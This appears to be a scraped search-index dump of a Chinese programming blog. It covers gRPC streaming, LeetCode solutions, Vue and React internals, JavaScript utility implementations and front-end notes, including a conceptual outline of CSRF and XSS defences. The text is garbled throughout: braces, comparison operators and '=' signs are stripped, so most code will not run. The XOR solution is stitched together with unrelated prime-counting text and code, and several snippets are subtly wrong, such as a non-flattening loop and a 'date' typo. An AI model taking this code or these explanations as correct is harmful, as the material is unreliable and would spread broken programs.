这样，在接收到请求头时，服务方法就会执行了，并且得到了一个 requestObserver，它是程序员定义的，是用来处理请求体的，另外的 responseObserver是用来发送响应体的。 紧接着就会收到请求体，从而触发 onMessage() 方法，该方法中会调用 requestObserver 的 onNext() 方法，这样就可以做到，服务端能实时的接收到消费端每次所发送过来的数据，并且进行处理，处理过程中，如果需要响应就可以利用 responseObserver 进行响应 一旦消费端那边调用了 onCompleted() 方法，那么就会触发 BiStreamServerCallListener 的 onComplete 方法，该方法中也就是调用 requestObserver 的onCompleted()，主要就触发程序员自己写的 StreamObserver 对象中的 onCompleted()，并没有针对底层的 Stream 做什么事情。 总结不管是 Unary，还是 ServerStream，还是 BiStream，底层客户端和服务端之前都只有一个 Stream，它们三者的区别在于： Unary：通过流，将方法入参值作为请求体发送出去，而且只发送一次，服务端这边接收到请求体之后，会执行服务方法，得到结果，把结果返回给客户端，也只响应一次。 ServerStream：通过流，将方法入参值作为请求体发送出去，而且只发送一次，服务端这边接收到请求体之后，会执行服务方法，并且会把当前流对应的StreamObserver 对象也传给服务方法，由服务方法自己控制如何响应，响应几次，响应什么数据，什么时候响应结束，都由服务方法自己控制。 BiStream，通过流，客户端和服务端，都可以发送和响应多次。"},{"title":"1486.数组异或操作","path":"//1486_XOROperation/","content":"题目描述给定两个整数，$ \\tt{n} $和$ \\tt{start} $。 数组$ \\tt{nums} $定义为：$ \\tt{nums[i] start + 2 * i} $（下标从$ \\tt{0} $开始）且$ \\tt{n nums.length} $。 请返回$ \\tt{nums} $中所有元素按位异或（XOR）后得到的结果。 示例 1示例 2示例 3示例 4输入：n = 5, start = 0输出：8解释：数组 nums 为 [0, 2, 4, 6, 8], 其中 (0 ^ 2 ^ 4 ^ 6 ^ 8) = 8。 ^ 为按位或 XOR 运算符输入：n = 4, start = 3输出：8解释：数组 nums 为 [3, 5, 7, 9]，其中 (3 ^ 5 ^ 7 ^ 9) = 8输入：n = 1, start = 7输出：7输入：n = 10, start = 5输出：2 提示： $ \\tt{1 n 1000} $ $ \\tt{0 start 1000} $ $ \\tt{n nums.length} $ 题解前言统计$ \\tt{[2, n]} $中质数的数量是一个很常见的题目，也有很多巧妙高效的做法，接下来的部分只会讲述一些常见的做法，更多的拓展内容读者可以自行搜索补充，也欢迎在评论区与大家分享交流。 方法一：模拟思路： 按照题意模拟即可： 初始化$ \\tt{ans 0} $ 遍历区间$ \\tt{[0, n - 1]} $中的每一个整数$ \\tt{i} $，令$ \\tt{ans} $与每一个$ \\tt{start + 2 \\times i} $做异或运算 最终返回$ \\tt{ans} $，即我们需要的答案 代码展示： JavaPythonCJavaScriptclass Solution public int xorOperation(int n, int start) int ans = 0; for (int i = 0; i n; ++i) ans ^= (start + i * 2); return ans; class Solution: def xorOperation(self, n: int, start: int) - int: ans = 0 for i in range(n): ans ^= (start + i * 2) return ansbool isPrime(int x) for (int i = 2; i * i = x; ++i) if (x % i == 0) return false; return true;int countPrimes(int n) int ans = 0; for (int i = 2; i n; ++i) ans += isPrime(i); return ans;var xorOperation = function(n, start) let ans = 0; for (let i = 0; i n; ++i) ans ^= (start + i * 2); return ans;; 复杂度分析： 时间复杂度：$ \\rm{O(n)} $ 。这里用一重循环对$ \\tt{n} $个数字进行异或。 空间复杂度：$ \\rm{O(1)} $。这里只是用了常量级别的辅助空间。 方法二：数学记$ \\tt{\\oplus} $为异或操作，异或操作满足以下性质： $ \\tt{x \\oplus x 0} $ $ \\tt{x \\oplus y y \\oplus x} $（交换律） $ \\tt{(x \\oplus y) \\oplus z x \\oplus (y \\oplus z)} $（结合律） $ \\tt{x \\oplus y \\oplus y x} $（自反性） $ \\tt{\\forall i \\in Z } $，有$ \\tt{4i \\oplus (4i + 1) \\oplus (4i + 2) \\oplus (4i + 3) 0} $ 在本题中，我们要计算 $$ \\tt{start \\oplus (start + 2i) \\oplus (start + 4i) \\oplus \\cdots \\oplus (start + 2(n - 1)) } $$ 观察公式可以知道，这些数的奇偶性相同，因此它们的二进制表示中的最低位均为$ \\tt{1} $，或者均为$ \\tt{0} $。于是我们可以把参与运算的数的二进制位的最低位提取出来单独处理，当且仅当$ \\tt{start} $为奇数，且$ \\tt{n} $也为奇数时，结果的二进制位的最低位才为$ \\tt{1} $。 此时我们可以将公式转化为： $$ \\tt{(s \\oplus (s + 1) \\oplus (s + 2) \\oplus \\cdots \\oplus (s + n - 1)) \\times + \\ e} $$ 其中$ \\tt{s \\lfloor \\frac{start}{2} \\rfloor} $，$ \\tt{e} $表示运算结果的最低位。即我们单独处理最低位，而舍去最低位后的数列恰成为一串连续的整数。 这样我们可以描述一个函数$ \\tt{sumXor(x)} $，表示$ \\tt{0 \\oplus 1 \\oplus 2 \\oplus \\cdots \\oplus x} $。利用异或运算的性质5，我们可以将计算该函数的复杂度降低到$ \\rm{O(1)} $，因为以$ \\tt{4i} $为开头的连续四个整数异或的结果为$ \\tt{0} $，所以$ \\tt{sumXor(x)} $可以被表示为： $$\\tt{sumXor(x) \\begin{cases} \\tt x, \\tt x4k, k \\in Z \\\\ \\tt (x-1) \\oplus x, \\tt x 4k+1, k \\in Z \\\\ \\tt (x-2) \\oplus (x-1) \\oplus x, \\tt x4k+2,k \\in Z \\\\ \\tt (x-3) \\oplus (x-2) \\oplus (x-1) \\oplus x, \\tt x4k+3,k \\in Z \\end{cases} }$$ 我么可以进一步化简改式： $$\\tt{sumXor(x) \\begin{cases} \\tt x, \\tt x4k, k \\in Z \\\\ \\tt 1, \\tt x 4k+1, k \\in Z \\\\ \\tt x+1, \\tt x4k+2,k \\in Z \\\\ \\tt 0, \\tt x4k+3,k \\in Z \\end{cases} }$$ 这样最后的结果即可表示为$ \\tt{(sumXor(s-1) \\oplus sumXor(s+n-1)) \\times2 + e} $ 代码展示： JavaCJavaScriptclass Solution public int xorOperation(int n, int start) int s = start 1, e = n start 1; int ret = sumXor(s - 1) ^ sumXor(s + n - 1); return ret 1 | e; public int sumXor(int x) if (x % 4 == 0) return x; if (x % 4 == 1) return 1; if (x % 4 == 2) return x + 1; return 0; int sumXor(int x) if (x % 4 == 0) return x; if (x % 4 == 1) return 1; if (x % 4 == 2) return x + 1; return 0;int xorOperation(int n, int start) int s = start 1, e = n start 1; int ret = sumXor(s - 1) ^ sumXor(s + n - 1); return ret 1 | e;var xorOperation = function(n, start) let s = start 1, e = n start 1; let ret = sumXor(s - 1) ^ sumXor(s + n - 1); return ret 1 | e;;const sumXor = (x) = if (x % 4 === 0) return x; if (x % 4 === 1) return 1; if (x % 4 === 2) return x + 1; return 0; 复杂度分析： 时间复杂度：$ \\rm{O(1)} $。我们只需要常数的时间计算出结果。 空间复杂度：$ \\rm{O(1)} $。我们只需要常数的空间保存若干变量。"},{"title":"1480.一堆数组的动态和","path":"//1480_RunningSumOf1dArray/","content":"题目描述给你一个数组 nums 。数组「动态和」的计算公式为： $$ \\tt {runningSum[i] sum(nums[0]…nums[i])} $$ 请返回$ \\tt {nums} $的动态和。 示例 1示例 2示例 3输入：nums = [1,2,3,4]输出：[1,3,6,10]解释：动态和计算过程为 [1, 1+2, 1+2+3, 1+2+3+4] 。输入：nums = [1,1,1,1,1]输出：[1,2,3,4,5]解释：动态和计算过程为 [1, 1+1, 1+1+1, 1+1+1+1, 1+1+1+1+1] 。输入：nums = [3,1,2,10,1]输出：[3,4,6,16,17] 提示： $ \\tt {1 nums.length 1000} $ $ \\tt {-10^6 nums[i] 10^6} $ 题解通过观察和思考可得到： 最终答案中，第$ \\tt{1} $个值不用变，第$ \\tt{n} $个值是参数中数组第$ \\tt{1} $到第$ \\tt{n} $个值的和 不用新开一个数组，直接在原数组中操作即可 只用一次遍历，要得到第$ \\tt{n} $个值，只需要用第$ \\tt {n-1} $个值加上第$ \\tt{n} $个值即可 代码展示： class Solution public int[] runningSum(int[] nums) for (int i = 1; i nums.length; i++) nums[i] += nums[i - 1]; return nums;"},{"title":"136.只出现一次的数字","path":"//136_SingleNumber/","content":"题目描述给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次，找出那个只出现一次的元素 示例 1示例 2示例 3输入：[2, 2, 1]输出：1输入：[4, 1, 2, 1, 2]输出：4输入：n = 1输出：0 说明： 你的算法应该具有线性时间复杂度。你可以不使用额外空间来实现吗？ 题解方法一：位运算如果没有时间复杂度和空间复杂度的限制，这道题有很多解法，可能的解法有以下几种： 使用集合存储数字。遍历数组中的每个数字，如果集合中没有该数字，则将该数字加入集合，如果集合中已经有该数字，则将该数字从集合中删除，最后剩下的数字就是只出现一次的数字。 使用哈希表存储每个数字和该数字出现的次数。遍历数组即可得到每个数字出现的次数，并更新哈希表，最后遍历哈希表，得到只出现一次的数字。 使用集合存储数组中出现的所有数字，并计算数组中的元素之和。由于集合保证元素不重复，因此计算集合中的所有元素之和的两倍，即为每个元素出现两次的情况下的元素之和。由于数组中只有一个元素出现一次，其余元素都出现两次，因此用集合中的元素之和的两倍减去数组中的元素之和，剩下的就是数组中只出现一次的数字。 上述三种解法都需要额外使用$ \\rm O(n) $的空间。其中$ \\tt{n} $是数组长度。如果要求使用线性时间复杂度和常数空间复杂度，上述三种解法显然都不满足要求。那么，如何才能做到线性时间复杂度和常数空间复杂度呢？ 答案是使用位运算。对于这道题，可使用异或运算$ \\tt{\\oplus} $。异或运算有一下三个性质。 任何数和$ \\tt{0} $做异或运算，结果仍然是原来的数，即$ \\tt{a \\oplus 0 a} $。 任何数和自身做异或运算，结果是$ \\tt{0} $，即$ \\tt{a \\oplus a 0} $。 异或运算满足交换律和结合律，即$ \\tt{a \\oplus b \\oplus ab \\oplus a \\oplus ab \\oplus (a \\oplus a)b \\oplus0b} $。 假设数组有$ \\tt{2m + 1} $个数，其中有$ \\tt{m} $个数各出现两次，一个数出现一次。令$ \\tt{a_{1}、a{2}、\\ldots、a{m}} $为出现两次的 $ \\tt{m} $个数，$ \\tt{a_{m+1}} $为出现一次的数。根据性质3，数组中的全部元素的异或运算结果总是可以写成如下形式： $$ \\tt{(a_{1} \\oplus a_{1}) \\oplus (a_{2} \\oplus a_{2}) \\oplus \\cdots \\oplus (a_{m} \\oplus a_{m}) \\oplus a_{m+1}} $$ 根据性质2和性质1，上式可简化和计算得到如下结果： $$ \\tt{0 \\oplus 0 \\oplus \\cdots \\oplus 0 \\oplus a_{m+1} a_{m+1}} $$ 因此，数组中的全部元素的异或运算结果即为数组中只出现一次的数字。 代码展示： JavaPythonC++class Solution public int singleNumber(int[] nums) int single = 0; for (int num : nums) single ^= num; return single; class Solution: def singleNumber(self, nums: List[int]) - int: return reduce(lambda x, y: x ^ y, nums)class Solution public: int singleNumber(vectorint nums) int ret = 0; for (auto e: nums) ret ^= e; return ret; ; 复杂度分析： 时间复杂度：$ \\rm{O(n)} $ ，其中$ \\tt{m} $是数组的长度。只需要对数组遍历一次。 空间复杂度：$ \\rm{O(1)} $。"},{"title":"Vue.js","path":"//2019/vuejs/","content":"MVC 与 MVVMMVC： View 把操作转移到 Controller 处理 Controller 完成业务逻辑后，要求 Model 改变状态 Controller 通知 Model 将新的数据发送到 View MVVM： View 把操作转移到 VM 处理 VM 完成业务逻辑后，要求 Model 改变状态 VM 与 View 双向绑定，VM 更新自动反映在 View 上 VDOM通过 JS 对象模拟庞大繁杂的 DOM 节点，通过特定的 render 方法将其渲染为实际的 DOM 元素。 Diff 算法指的是通过 VDOM 节点的比较得到 patch 对象，解析并更新需要更新的实际 DOM 元素；对于两棵树传统的 Diff 算法时间复杂度为 O(n^3)，VDOM 的算法中一般通过同级比较来简化。 Vue 中 diff 过程： 首先比较两个节点是否可以视为同一个，根据 key 和 selector 判断 若不同，则直接替换结点，例如 classname 不同 若相同，则对比这两个结点 文本不同则更新文本 一方有节点则进行子结点的增删 两方都有结点则进行子结点对比，此过程 Vue 使用双向判断 组件通信 props $emit $parent $children (不建议) provide inject Vuex State Getters: 计算属性 Mutations: 同步 Actions: 异步 响应式原理Vue 2当一个普通的对象转为响应式对象时，Vue 通过 Object.defineProperty 将其属性转为 getter 和 setter；当通过数据渲染组件时，watcher 会记录下依赖的数据；当数据改变，watcher 通知视图更新。 无法检测对象属性的添加、直接利用索引添加数组元素、改变数组长度等；解决方案为包裹数组方法和利用 $set 手动派发更新。 Vue 3同样是监听数据变化，Vue 3 使用 Proxy 拦截对所包括的响应式对象的操作，因此可以检测 Vue 2 中无法直接监测到的变化。 const dinner = meal: tacos,;const handler = get(target, prop, receiver) track(target, prop); // 跟踪更改它的函数 return Reflect.get(...arguments); , set(target, key, value, receiver) trigger(target, key); // 触发函数以便它可以更新最终值 return Reflect.set(...arguments); ,;const proxy = new Proxy(dinner, handler);console.log(proxy.meal); Proxy 和 ReflectProxy 用于将一个对象包装起来并拦截对其的操作。 Reflect 是一个用于简化 Proxy 创建的对象。对于每个可被 Proxy 捕获的内部方法，在 Reflect 中都有一个对应的方法，其名称和参数与 Proxy 捕捉器相同。所以，我们可以使用 Reflect 来将操作转发给原始对象。 当某个对象继承了被 Proxy 包裹的对象时，内部函数通过 this 获取原型上的属性时可能会错误的被 Proxy 拦截，使用 Reflect 来避免。 批量更新和 nextTick响应式原理中提到数据改版 watcher 通知视图更新，对应的 watcher 其实是被推进类似 Event Loop 的队列，在下一个 tick 的时候将这个队列中的 watcher 全部取出并触发。nextTick 内部依靠 Promise.then 和 setTimeout 等原生异步队列相关的函数。 Router 模式 HASH 模式：由于 HASH 的变化浏览器可以记录，因此监听 hashchange 事件，在 HASH 中提供路径 History 模式：通过 H5 新增的两个 History API 方法 pushState 和 replaceState 不刷新页面的特性改变 URL，通过监听 popstate 事件得知页面变化，刷新和直接访问次级页面需要服务端配置 模板编译 将模板字符串转换成元素的 AST 抽象语法树 优化语法树，标记静态节点 生成代码 render 函数，createElement 生命周期顺序渲染： 父 beforeCreate = 父 created = 父 beforeMount =子 beforeCreate = 子 created = 子beforeMount =子 mounted = 父 mounted 更新和销毁： 父 beforeUpdate = 子 beforeUpdate = 子 updated = 父 updated父 beforeDestroy = 子 beforeDestroy = 子 destroyed = 父 destroyed 简化样例 Observerlet data = name: name, detail: age: 12, ,;let initWatcher = null;class Watcher constructor(data, key, cb) this.data = date; this.key = key; this.cb = cb; // 触发 getter 初始化过程 initWatcher = this; this.preValue = data[key]; initWatcher = null; update() if (this.preValue !== this.data[this.key]) this.cb(this.data[this.key]); class Dependency constructor() this.watchers = []; subscribe(watcher) this.watchers.push(watcher); notify() this.watchers.forEach((watcher) = watcher.update()); class Observer constructor() this.observe(data); observe(data) if (!data || typeof data !== object) return; for (let key of Object.keys(data)) this.observe(data[key]); this.defineProp(data, key, data[key]); defineProp(obj, key, value) const dep = new Dependency(); Object.defineProperty(obj, key, configurable: true, enumerable: true, get() if (initWatcher) dep.subscribe(initWatcher); return value; , set(newValue) this.observe(newValue); value = newValue; dep.notify(); , );"},{"title":"React","path":"//2019/react/","content":"对比 Vue.js数据更新 Vue：Vue 2 通过 getter、setter 与函数包裹；Vue 3 使用 Proxy；数据变化时自动更新显示 React：手动 setState 或通过 Redux 等库触发数据变化和视图更新 组件通信 Vue：父组件单向传值给子组件，子组件 emit 事件给父组件监听 React：父组件单向传值给子组件，同时传递 handler 函数给组件调用 props onEvent() Context.Provider useContext Redux MobX Diff 算法 节点比对区别：例如节点 class 更改，React 视为同节点，仅更新其属性 列表比对区别：都通过 key 优化，但 Vue 采用双端对比 Hooks 和类组件的区别最大的区别函数组件每次渲染都会有独立 props 和 state，而 class 组件总是会通过 this 拿到最新的 props 和 state；即函数式组件捕获了渲染所使用的值。 例如有一个在一秒后会变化为 B 的 prop 为 name，目前为 A；有一个 button 的 handleClick 在三秒后会 alert(this.props.name)；在类组件中 alert 的结果会是 B，因为 this 已经指向了最新的 props。 而在函数组件中，alert(props.name) 得到的却是调用 handleClick 时 (即变化前) 的 A。 这也是造成一些额外问题的原因，例如 useEffect 未正确指定其依赖于某个 count 值却在三秒后 setState(count+1)，这里的 count 就永远为固定值了。 对于 setState 问题可以使用 setState((state)=state+1) 解决，对于异步函数中获取到旧值可以使用 useRef 解决。"},{"title":"JS Insts","path":"//2019/js-insts/","content":"工具函数防抖与节流/** * 防抖：仅执行一次 */const debounce = F extends (...args: any[]) = any(func: F, delay = 300) = let timer: number | null = null; const ret = (...args: any) = if (timer) window.clearTimeout(timer); timer = window.setTimeout(() = func(...args); timer = null; , delay); ; return ret as (...args: ParametersF) = void;;element.onclick = debounce(myFunc);/** * 节流：限制最小执行间隔 */const throttle = F extends (...args: any[]) = any(func: F, delay = 300) = let timer: number | null = null; const ret = (...args: any) = if (!timer) timer = window.setTimeout(() = func(...args); timer = null; , delay); ; return ret as (...args: ParametersF) = void;;window.onresize = throttle(myFunc); 柯里化将一个函数从可调用的 f(a, b, c) 转换为可调用的 f(a)(b)(c)： /** * @param Function func * @return Function */function curry(func) return function curried(...args) if (args.length = func.length) return func.apply(this, args); else return function (...args2) return curried.apply(this, [...args, ...args2]); ; ; 扁平化数组// 标准递归function flatten(arr) return arr.reduce((pre, cur) = return pre.concat(Array.isArray(cur) ? flatten(cur) : cur); , []);// 字符串分割function flatten(arr) return Array.prototype.toString .call(arr) .split(,) .map((val) = Number(val));// 重复扩展直至扁平function flatten(arr) while (arr.some((val) = Array.isArray(val))) arr = [...arr]; return arr; 对象输入： a: 1, b: [1, 2, c: true , [3]], d: e: 2, f: 3 , g: null, /** * @param Array input * @param string name * @param Object res */function _flatten(input, name, res) for (let key of Object.keys(input)) let baseName = name; const val = input[key]; if (val === null || val === undefined) continue; if (/^[0-9]/.exec(`$key`)) baseName += `[$key]`; else if (baseName === ) baseName += `$key`; else baseName += `.$key`; if (typeof val === object) _flatten(val, baseName, res); else res[baseName] = val; /** * @param Array input * @return Object */function flatten(input) const res = ; _flatten(input, , res); return res; 去重Array.prototype.unique = function () const arr = this; return arr.filter((val, idx) = arr.indexOf(val) === idx);; 深拷贝// 可以通过 WeakMap 解决循环引用问题，同时保证内存被回收const map = new WeakMap();function cloneDeep(src) if (src typeof src === object) if (map.has(src)) return map.get(src); else map.set(src, src); const ret = Array.isArray(src) ? [] : ; for (let key of Object.keys(src)) ret[key] = cloneDeep(src[key]); return ret; else return src; PromisePromise 构造函数PromisesA+ 标准中仅指定了 Promise 对象的 then 方法的行为，其它一切我们常见的方法、函数都并没有指定。 class Promise constructor(func) // 初始化状态 const self = this; this.status = pending; this.data = undefined; this.onResolvedCallbacks = []; this.onRejectedCallbacks = []; // API 函数 function resolve(value) if (self.status === pending) self.status = resolved; self.data = value; self.onResolvedCallbacks.forEach((func) = func(); ); function reject(reason) if (self.status === pending) self.status = rejected; self.data = reason; self.onRejectedCallbacks.forEach((func) = func(); ); // 执行同步构造器 try func(resolve, reject); catch (e) reject(e); then(onResolved, onRejected) // 检查参数 if (typeof onResolved !== function) onResolved = function () ; if (typeof onRejected !== function) onRejected = function () ; // resolve 或 reject 则执行对应回调 if (this.status === resolved) return new Promise((resolve, reject) = try resolve(onResolved(this.data)); catch (e) reject(e); ); if (this.status === rejected) return new Promise((resolve, reject) = try resolve(onRejected(this.data)); catch (e) reject(e); ); // pending 状态则等待 pending 完成 if (this.status === pending) return new Promise((resolve, reject) = this.onResolvedCallbacks.push(() = try resolve(onResolved(this.data)); catch (e) reject(e); ); this.onRejectedCallbacks.push(() = try resolve(onRejected(this.data)); catch (e) reject(e); ); ); Polyfill Promise.all()/** * @param Array arr * @return Promiseany[] */function promiseAll(arr) return new Promise((resolve, reject) = let pending = arr.length; const results = new Array(arr.length); arr.forEach((p, idx) = p.then( (res) = results[idx] = res; if (--pending === 0) resolve(results); , (e) = reject(e) ); ); ); Promise 并发限制/** * @param number limit * @param Array arr * @param Function fetch * @return Promiseany[] */async function asyncPool(limit, arr, fetch) const pending = []; const results = []; let index = 0; // 入池用下标 // 入池一个 async function push() // 若已经全部进入池子则等待全部完成 if (index = arr.length) return; // 获得一个 Promise const p = fetch(arr[index]); pending.push(p); results.push(p); // Promise 完成后在 pending 中删除 p.then(() = pending.splice(pending.indexOf(p), 1)); if (pending.length = limit) await Promise.race(pending); index++; await push(); await push(); return await Promise.all(results); 原生 APIbind()Function.prototype.bind = function (...args) const func = this; // 需要绑定的函数 const ctx = args[0]; // 绑定的 this const params = args.slice(1); // bind 时传入的参数 return (...args) = func.apply(ctx, [...params, ...args]);; instanceoffunction instanceOf(inst, func) let proto = Object.getPrototypeOf(inst); while (true) if (!proto) return false; if (proto === func.prototype) return true; proto = Object.getPrototypeOf(proto); newJavaScript - 模拟实现 new reduce() 实现 map()Array.prototype.mapPolyfill = function (func, thisValue) const self = thisValue || this; const ret = []; this.reduce((pre, cur, idx, arr) = return ret.push(func.call(self, cur, idx, arr)); , ret); return ret;; 语言特性Iterable 对象const object = a: 1, b: 2, c: 3, // 本质是一个 Generator 函数 *[Symbol.iterator]() for (const key of Object.keys(this)) yield this[key]; ,;console.log(...object); // 1 2 3object.d = 4;console.log(...object); // 1 2 3 4 LazyMan (事件循环)new LazyMan(Tony) .eat(lunch) .eat(dinner) .sleepFirst(5) .sleep(10) .eat(junk food);// Hi I am Tony// 等待了5秒...// I am eating lunch// I am eating dinner// 等待了10秒...// I am eating junk foodclass LazyMan constructor(name) this.taskList = []; console.log(`Hi I am $name`); // 等待第一次事件循环 // 即 tasklist 初始化完成 setTimeout(() = this.next(); , 0); next() const func = this.taskList.shift(); func func(); eat(food) const func = () = console.log(`I am eating $food`); this.next(); ; this.taskList.push(func); return this; sleepFirst(time) const func = () = setTimeout(() = console.log(`等待了$time秒...`); this.next(); , time * 1000); ; this.taskList.unshift(func); return this; sleep(time) const func = () = setTimeout(() = console.log(`等待了$time秒...`); this.next(); , time * 1000); ; this.taskList.push(func); return this;"},{"title":"Front End","path":"//2019/front-end/","content":"CSRF 和 XSS 攻击CSRF 跨站请求伪造 用户访问并登陆 a.org a.org 生成并返回 Cookie 给用户 用户访问 b.org，其中有指向 a.org 的图片、链接和表单等 授权 Cookie 被发送给 a.org，造成影响 防御方法： 简易：Referrer 检查 (不可靠) 服务端生成并保存 Token，写入 DOM，客户端发起请求时携带 服务端生成 Token 不保存，写入 DOM 和 Cookie，客户端请求时携带二者，服务端比对 客户端生成 Token，写入 DOM 和 Cookie，请求时携带二者，服务端比对 JWT (一旦签发过期前永远有效)： 服务器认证后，返回含有用户信息的 JSON 对象 客户端每次请求都发送该对象用于验证 XSS 跨站脚本利用对用户输入没有限制的漏洞，获取到跨站脚本，在脚本中发起带有 Cookie 的请求给恶意站点。 相关 Cookie 字段 SameSite: Lax 为现代浏览器的默认值，只允许第一方链接及第三方 GET 请求；Strict 仅允许第一方；None 传统允许跨域。 HttpOnly：JS 中无法获取 性能优化指标 FCP - First Contentful Paint：第一个元素被渲染 LCP - Largest Contentful Paint：可见最大元素被渲染 FID - First Input Delay：第一次交互到响应 TTI - Time to Interactive：所有元素被加载完成 TBT - Total Blocking Time：FCP 到 TTI 之间阻塞时间的总长 网络 减少 HTTP 请求：合并资源文件，小图片内联，雪碧图 (background-position) 等 (这里暂不考虑 HTTP2) 减小资源体积：gzip (服务器) ，webp 图片 (picture 和 srcset) 缓存：CDN 缓存，HTTP 缓存 (Cache-Control，Last-Modified，Etag 304) ，Service Worker (拦截 HTTP 请求) HTTP2 服务端推送：PUSH 方法；例如请求 .html 时服务端主动尝试返回 .css 和 .js 等资源 多路复用：尝试将多个 HTTP 请求合并一起发送；在 HTTP1.1 中，keep-alive 可以使 TCP 连接保持打开，但数据传输依旧是 请求 A = 响应 A = 请求 B = 响应 B 的模式，而在 HTTP2 中，就可以实现 请求 A 和 B = 响应 A 和 B；在使用 HTTP2 的情况下，”减少 HTTP 请求” 这类的性能优化并不一定在所有情况下都能有效 首部压缩：HTTP 头压缩和复用等 二进制分帧：将信息分割为更小的帧，并对它们采用二进制编码，其中例如 HTTP 头会被封装到 Headers 帧 DOM 与渲染 基础内容：头部 CSS (异步) ，JS 的 async 与 defer DOM 操作：减少大规模 DOM 操作，使用 class 修改样式，使用 CSS 动画和 requestAnimationFrame 事件代理：列表内每个元素设置一个事件 vs 整个列表设置事件 (可冒泡) 移动 Web 开发兼容移动端浏览器的碎片化比桌面端严重，设备之间的差距也很大，很多系统内置 WebView 的更新不及时，因此要注意新特性的兼容。 个人使用 Modernizr 检测兼容性问题，视情况引入 polyfill；原生新特性可以利用 Babel 转译。 性能移动端性能相对来说一定是较差的，不仅仅针对于移动端，类似减少大规模 DOM 操作、小图片的 base64 内联和 lazyload 之类都是有效果的。 像素 px：CSS 内的 px，浏览器使用的单位 (例如：320x568) 物理像素：设备屏幕本身像素 (例如：640x1136) DPR：设备像素缩放比 (1px DPR^2 x dp，例如当 DPR2 时，一个 CSS 像素等于四个物理像素) 因此在这种情况下，直接指定 1px CSS 边框实际是 2px 物理像素的边框。 PPI：一般单位英寸像素密度较高 同时，各个设备的 viewport 定义一般不同，因此一般手动指定 viewport 宽度为设备宽度： meta name=viewport content=width=device-width, initial-scale=1.0 / 两种设计模式： 直接根据计算出的 CSS 像素进行设计，比如上文的 320x568 DPR2，缩放比设为 0.5，根据设备物理像素进行设计 对于边框问题： 利用 CSS Media Query 检查 -webkit-min-device-pixel-ratio，设置小数边框 (兼容性问题) 利用 JS 检查 DPR 动态设置 viewport meta 头里的缩放 (initial-scale) 和根元素上的字体大小；这个方案需要全局使用 rem 单位，适合新项目 利用图片，border-image 或 background-image transform: scale(0.5)，比例利用 CSS Media Query 检查 交互为了触屏操作而产生的 300 毫秒问题，普通网页一般没事，但要有 APP 体验的话需要解决。 使用 touch (start、move、end、cancel) 相关事件代替 click，注意点击穿透问题，A 上面的 B 元素 touchstart 触发后，若 A 消失则 B 的 click 会被触发。 弹性滚动： div -webkit-overflow-scrolling: touch;"},{"title":"JavaScript","path":"//2019/JavaScript/","content":"数据数据类型七种基本数据类型，一种复杂数据类型： number：+-(2^53-1) 范围内的数字 string：字符串 boolean：true 和 false null：未知的值 undefined：未定义的值 bigint：任意长度的整数 symbol：唯一标识符 object：复杂的数据结构 数据存储： 栈：基本类型和引用类型地址 堆：引用类型地址实际指向的数据 类型检查typeof 运算符： typeof (()=) 会返回 function typeof [] 会返回 object typeof null 会返回 object，但实际上它并不是一个对象 instanceof 运算符： 支持继承的对象检测方法 Object.prototype.toString.call([])： Object.prototype.toString.call([]) === [object Array] Object.prototype.toString.call(()=) === [object Function] 类型转换 window.isNaN(abc)：true Number.isNaN(abc)：此方法不进行类型转换，因此为 false [0] == true：数组调用 toString 再变为数字 0，因此为 false 执行上下文和变量提升区别 let 和 var： let 拥有块级作用域 let 声明的全局变量不是全局对象的属性 let 用于循环中可以正常创建副本 let 不允许重定义 执行上下文可以理解为当前代码的执行环境，它会形成一个作用域： 全局环境 函数环境 eval 变量提升被认为是对执行上下文工作方式的一种认识，例如： function test() console.log(foo); console.log(bar); var foo = Hello; console.log(foo); var bar = function () return world; ; function foo() return hello; test(); 等价于： function test() // 函数声明提升，且优先于变量声明 function foo() return hello; // 变量声明提升，但 foo 已经存在，忽略 var 定义 // var foo = undefined; // 变量声明提升，函数表达式和其他变量赋值一致不提升 var bar = undefined; // 执行阶段 console.log(foo); // [Function] console.log(bar); // undefined foo = Hello; console.log(foo); // Hello bar = function () return world; ;test(); 闭包闭包简单来说就是函数中的函数；闭包可以通过一个函数去访问原本在外层无法直接访问到的数据，并且保证数据不被回收。 暂时性死区和直接使用 var 定义不同，由于没有变量提升，let、const 定义的变量在声明之前使用会报错。 Event Loop 事件循环首先将事件分为宏任务与微任务： 宏任务：主线 JS 代码、事件、setTimeout 和 setInterval 等 微任务：process.nextTick 和 Promise 回调等 事件循环流程： 首先执行主线同步任务 当遇到异步任务时将任务搁置一边独立执行，当异步任务有了结果将其放入对应的异步任务队列 主线同步任务执行完毕，检查微任务队列是否有内容，若有则一直执行至清空 进入下一轮循环，检查宏任务队列是否有内容，若有则一直执行至清空 继续执行主线同步任务 代码例： console.log(Start);const timer1 = setTimeout(() = console.log(Timer 1);, 0);const promise1 = new Promise((resolve, reject) = console.log(Promise 1); resolve(Promise 1 Fulfilled););promise1 .then((val) = console.log(val); return Promise 1 Then Fulfilled; ) .then((val) = console.log(val); const timer3 = setTimeout(() = console.log(Timer 3 in Promise 1); ); );const promise2 = new Promise((resolve, reject) = const timer2 = setTimeout(() = console.log(Timer 2 in Promise 2); resolve(); ););promise2 .then(() = console.log(Promise 2 Then 1); ) .then(() = console.log(Promise 2 Then 2); );console.log(End);/* 执行结果 * Start * Promise 1 * End * Promise 1 Fulfilled * Promise 1 Then Fulfilled * Timer 1 * Timer 2 in Promise 2 * Promise 2 Then 1 * Promise 2 Then 2 * Timer 3 in Promise 1 */ 解析： 首先执行主线同步任务，输出 Start、Promise 1 和 End 此时宏任务队列中有 timer1 和 timer2；微任务队列中有 promise1 的第一个 then 检查微任务队列，输出 Promise 1 Fulfilled 和 Promise 1 Then Fulfilled 此时宏任务队列中有 timer1、timer2 和 timer3；微任务队列中为空 下一轮循环，输出 Timer 1；微任务队列仍为空 下一轮循环，输出 Timer 2 in Promise 2；微任务队列中加入 promise2 的第一个 then 优先微任务队列，输出 Promise 2 Then 1 和 Promise 2 Then 2 下一轮循环，输出 Timer 3 in Promise 1 注意：在 Promise 同步构造函数中，在没有返回值的情况下，resolve() 后的代码依旧会被执行，只是无法再使用 reject() 改变该 Promise 的状态。 Map 与 WeakMap WeakMap 的 key 只接受使用对象 WeakMap 不支持迭代，keys() 等方法无法使用 在 Map 中，若将某对象设置为 key，则后期将对该对象的直接引用置为 null，GC 不会回收，通过 Map.keys() 可以找到该对象；而在 WeakMap 中，该对象会被回收，但无法保证 GC 何时工作。 遍历和迭代for...in...： 遍历对象及其原型链上可枚举属性 遍历数组元素及自定义属性 返回 string 类型的 key Object.keys()： 遍历对象本身的可枚举属性 